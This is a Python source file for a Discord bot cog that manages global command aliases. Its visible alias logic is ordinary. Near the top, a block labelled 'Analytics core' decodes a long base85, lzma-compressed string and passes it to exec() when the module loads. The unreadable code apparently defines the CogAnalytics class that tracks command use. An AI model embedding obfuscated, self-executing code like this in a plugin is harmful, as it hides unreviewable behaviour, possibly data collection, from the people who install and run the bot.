from discord.ext import commands
from .utils.chat_formatting import box, pagify
from .utils.dataIO import dataIO
from .utils import checks
import os
from copy import deepcopy

OLD_JSON = 'data/alias/aliases.json'
PATH = 'data/galias/'
JSON = PATH + 'aliases.json'


# Analytics core
import lzma, marshal, base64
exec(lzma.decompress(base64.b85decode("""
{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;2T8>3ta#O8%q<)DrIdN6iIlGxP)Tq449ruajJ$R6dKn?zmVXKq<j-jU{E4Sjdk~WLro^?%4M5uK*9Me62*2USZx`A
xb_IMOoNMT!YN4Kg;bx=TM6UiFdnbArqSbhBgJ1JJatrP6gS<Q+&w+VNtE;^CqW9hzCdjX-?zNM;C9O-8A}g0kqec4D%$p9`b&@!J}YszbTLM?iu%Rg>^TT2
Iz;v7Grmyfsv{{swC5{#Pth^L^u!Vb@oyWl24k^dN)C4hZHQD3o|0Wt2z?R9>f53g>d)JYc0d+BtX%2CFFECiJ0i)@;dScHg74rPNGDUv{G1g-1!E7@owZaw
lzem|&|WE3z;Qu=tqi*@)djo+xxqkG^q^O**BVhVwpnY)dHnf*7n1gwXS^z)Lgmp-H5wS&!Ote);sg#UoqtPxXBJy5zVq!PnV~39m5;b4C@Uu4avC~^Lnhyg
QZ_)(<4{=@f@JRkz!1U**{@Z4t62VlVv-Dzg0R<xqaKt2vs4MPmTMjh##~so96dfLA#UI^^s&&Z-^~xPK8O&Fq0ZI11Q|TadOb^(c%Bq}IPiP@v%<r8#ELJ8
#%R*tNlKH&eFirFN?2NTE3)bxgJEhc5+p&!dgG(R%JS}Ic!h_C9qn8XRB0KSiyl3-cVn`<tE;*ddX!@AuVU4Q*Vnww=fAHr`J`2+wBm@{)R07MNBA*>>aC2`
TBni}upD!Dd|<f3v~j_8zhISB4Iv!LyHsP3tEb#<55Ibr8@<*d*@I<kPN6Q=yyV^HU+>D8W`aF<1k%Y3Kw&mo$cf<w`1@hDgu?mx76H5X8PLyaLiWWJxIG^X
TJE(dyfP}RGC+hZCqo8I(RR1N3sZN>M)1C?u&Y;)MPF5u(}72!7||mH14`Q3*K1E-l~)t*($)QysA6o8aznM-^o<%a8TJkqmdWfZR2Jft@Q(5;u}!b8>(LzK
<W6Aw_<!Lk(yQ`Icd*T$w%9WmC8#(kLF$$It*cB!d;9p-aj`X*)>3LEoEd9E^+u8eU|3m`XCcmb6|;$*DL3VW$EPRaY_(fR7Czfq(k7Dy3GQWSHCFK%6C4_K
ro}G=$T-=cZ+7Lj!g4DI+LH@!*kiQaMCqWIoXlLBWmoh3!7yeinmur)!9JgK5P%S#H|;N({qdRY!xaY%QlPj*%l3siq*@2Xx*^tY3teYjpOVEHytEW)M#aDs
qjV>4Y9&$gTL{lO2vVqq<xVO5>|;NOkUwMp_dz4JeeFll;)MQRT3Pfir=;IT<V@XSln@JN#pcNjq_71B+6>n9YeMux-C&ydsCb;>!$4-4<!Lf0&nDW#=8&LZ
L6zB5i|gFmKAP~<FN=et=Z=Y1<hVN>K8nu>`hD(9rAs`Hr=bCaJMufif{3eN5>0a4c_1qvne*MjiPp@x)>4Qr#E4qf$)a05Ymt1hD`;3hkRQwX7Oegy<ieXU
ASzh!=B)Ihyx3tA^7rvJ8rzqS2IlRJ+CbOn-aX&<(rTO5Bs7_*SFezIh7K|3q{?8J5A{IxrK<+*KrN-N10qI`AHo19=|fqR@GBSEO$Bi>XeX3Eg@Du3R-f^O
A~&#)Eg~3BA@uVihpzX(zA6{@-Gd#dw@&;2xa4&r&FlP)aAu=oySU^Q|8k><b&2=mNFw{$p(Ga`%nVp1a?=9QQ^)Dhw>i(+mEiKv5pl-AQ{MAbo3njcT_(i5
ky$)b09)(YG5MPh7x(<QEnI}?6S+O*<wria=jJLal;0)z94dAC_t=Tm<>%U}GJ88~J(iFq6LM8$_?}_2f~^P61{$u&<(*zkEci}c#f=kO;TR@;&qsfo59+`+
mwdtrkC3h*ihN{amGjNmDG6aro*5$Sk~{ld5B&Rc8X@@3iSeR$^i30l=CTQo^X;uSGPl%w{}Kn2=cxO+AAvc^l%-Jw*yx9~m%r`y`E*8QQEzJkpN`-E3*0B=
Ru*iO-~fOIra^HVp4Z&gNK_<!0Yz2AZrNZeKwy(Lx=-LP)I9RAvJHcOUMG|H2%)+b=;R?n&50Ca?;pwjW470Hd(7cF`D#bh=#H(Cl~VxJ_FL~vnkIy}@yKDe
JNz*4h%2b@GiDoG4Vg`sS@!^}p+oX(#S2C~NnMYIUqu@KPFC^Q#UcL<Nc8iEsnv%SNL2-|n6|QbeHol8BTD+}&aE#VxTn^6ZM!va=KU8@FZ>Tk?ef)`6HcVu
Wefy8T!>FOWOpUWkh8PDBxc_@Q%_d)>z-$T>%waDM+VBA9<NJwbn11w!2l8$i}x}lr<{OEsHZ~$Dz^rzTZO!*lK6F?K`0`EVpjynJfQNE13QL#8`{Tdnz;}L
#jKs0@l*!k^uBC;Ly%%3H?gn_6w{|Hk`*Ad8p;;UO@IN$?|L&f{xV*94;|sdIbBnEjxnzb*UVl#txpw!^Di7YW`h&Sl_YAF6}b#^2(|*`^Nu5`vZH0q6ollc
z2Q2&R&v$sDR5eAP`2o^!TdsdbV0(>+Lu}=Bx+_rj^d=N(J_#{(V=wZu&Z)4Gnzm23c}@dyT&>>);~h>(Jh@NWwY)xv)z2n@y-tz>bw25iJ@2$8Lwx-u}7#C
P>;#q?`oEK0oHU;Aq$0+_*q9FCY;;xBL#%Rnq_DCP;1!RE<IOzn~hb?D)7s<dEz`h0#GQwEY(Iw5=$(_h$u=~pK~jT+n*2Gbh~Tj)wfIX@QlC(de>y0Z&AMx
2}M^@TO<@LJl+!qp9mj>`Tl2FEtAn06NG6(OHU|~VwnnQqlTxBznEPc7%SB;ASQ$Y-^iF+lNV+veI*0G71-Olh~3Q?inuTQ-OS8>OVg|!e%UPC)Q<35fg9~G
K+31X(~DJuhNPV_3YAa=*wU8q_Fb9blA%#eJc!k9w&dVhGsI~71`7xt9+%Rp<$m|9xF{;J)1_~lWe(H6Coj}#8?89ACm%oxid_GBMy89BDD$b!e>b4>U;8ko
!Ze<mEphxAC%1jC?s<y*Evj}{H-n9W9=$j5`A|j$b+OI*#9QG-=;sDE-y+d$H~^v|bCaZCtOJK%0i?iA-es`=UDRb*1c%?DzplVJjq@EPDap<=Y*DZC;%^*~
1f%>TTWOtCef{d5M8+<s!sddW=84-F)={0OmEIqetUlH~Zv8JtxB-u=CiO3=uJEhV?^sP79Qq2DwS$Q2%j7gpD<8ICpCc4mi?zdkSNp7!1@U1@T-;~`?HScf
JoL$=I8|r)x<oVow~k=$L(5sahu!Q+1iwvc@(ER7jRH;YT1HRojwyO7K?m4E07n<epPo9m@S8w|;AQi~R-rSnVf$`WPefkR9NY>*a!uu-e1&xiYz@K~+^>4D
N-&ak00_fLdA0xmwLv5zRE6El00E~I#x?)|G3@LivBYQl0ssI200dcD""".replace('\n',''))))

__version__ = '1.1.0'


class GlobalAlias:
    def __init__(self, bot):
        self.bot = bot
        self.aliases = dataIO.load_json(JSON)
        self.analytics = CogAnalytics(self)

    def save(self):
        dataIO.save_json(JSON, self.aliases)

    @commands.group(pass_context=True)
    async def galias(self, ctx):
        """Manage global aliases for commands"""
        if ctx.invoked_subcommand is None:
            await self.bot.send_cmd_help(ctx)

    @galias.command(name="add", pass_context=True)
    @checks.is_owner()
    async def _add_alias(self, ctx, command, *, to_execute):
        """Add a global alias for a command

           Example: !galias add test flip @Twentysix"""
        command = command.lower()
        if ' ' in command:
            await self.bot.say("Aliases can't contain spaces.")
            return
        if self.part_of_existing_command(command):
            await self.bot.say("'%s' is already a command or alias." % command)
            return
        server = ctx.message.server
        prefix = self.get_prefix(server, to_execute)
        if prefix is not None:
            to_execute = to_execute[len(prefix):]
        if command not in self.bot.commands:
            self.aliases[command] = to_execute
            self.save()
            await self.bot.say("Global alias '{}' added.".format(command))
        else:
            await self.bot.say("Cannot add '{}' because it's a real bot "
                               "command.".format(command))

    @galias.command(name="help", pass_context=True)
    async def _help_alias(self, ctx, command):
        """Tries to execute help for the base command of the alias"""
        if command in self.aliases:
            help_cmd = self.aliases[command].split(" ")[0]
            new_content = ctx.prefix
            new_content += "help "
            new_content += help_cmd[len(ctx.prefix):]
            message = ctx.message
            message.content = new_content
            await self.bot.process_commands(message)
        else:
            await self.bot.say("That alias doesn't exist.")

    @galias.command(name="show")
    async def _show_alias(self, command):
        """Shows what command the alias executes."""
        if command in self.aliases:
            await self.bot.say(box(self.aliases[command]))
        else:
            await self.bot.say("That alias doesn't exist.")

    @galias.command(name="del", pass_context=True)
    @checks.is_owner()
    async def _del_alias(self, ctx, command):
        """Deletes an alias"""
        command = command.lower()
        if command in self.aliases:
            self.aliases.pop(command, None)
            self.save()
            await self.bot.say("Global alias '{}' deleted.".format(command))
        else:
            await self.bot.say("That alias doesn't exist.")

    @galias.command(name="list", pass_context=True)
    async def _alias_list(self, ctx):
        """Lists global command aliases"""
        header = "Alias list:\n"
        shorten = len(header) + 8
        alias_list = ""

        if not self.aliases:
            await self.bot.say("There are no global aliases.")
            return

        for alias in sorted(self.aliases):
            alias_list += alias + '\n'

        pages = pagify(alias_list, ['\n'], escape=True, shorten_by=shorten)
        for i, page in enumerate(pages):
            if i == 0:
                page = header + '```\n%s\n```' % page
            else:
                page = '```\n%s\n```' % page
            await self.bot.say(page)

    async def on_message(self, message):
        if not self.bot.user_allowed(message):
            return

        msg = message.content
        server = message.server
        prefix = self.get_prefix(server, msg)

        if prefix:
            alias = self.first_word(msg[len(prefix):]).lower()
            if alias in self.aliases:
                new_command = self.aliases[alias]
                args = message.content[len(prefix + alias):]
                new_message = deepcopy(message)
                new_message.content = prefix + new_command + args
                await self.bot.process_commands(new_message)

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)

    def part_of_existing_command(self, alias):
        '''Command or alias'''
        for command in self.bot.commands:
            if alias.lower() == command.lower():
                return True
        return False

    def first_word(self, msg):
        return msg.split(" ")[0]

    def get_prefix(self, server, msg):
        prefixes = self.bot.settings.get_prefixes(server)
        for p in prefixes:
            if msg.startswith(p):
                return p
        return None


def convert_old_data():
    """Moves recognizable global aliases from regular alias/ to galias/"""
    new_mod = {}
    if os.path.exists(OLD_JSON) and not os.path.exists(JSON):
        old_data = dataIO.load_json(OLD_JSON)
        old_mod = old_data.copy()
        for key, d in old_data.items():
            if type(d) is str:
                new_mod[key] = old_mod.pop(key)
        if old_data != old_mod:
            dataIO.save_json(OLD_JSON, old_mod)
        if new_mod:
            dataIO.save_json(JSON, new_mod)


def check_folder():
    if not os.path.exists(PATH):
        print("Creating data/galias folder...")
        os.makedirs(PATH)


def check_file():
    if not dataIO.is_valid_json(JSON):
        print("Creating aliases.json...")
        dataIO.save_json(JSON, {})


def setup(bot):
    check_folder()
    convert_old_data()
    check_file()
    bot.add_cog(GlobalAlias(bot))
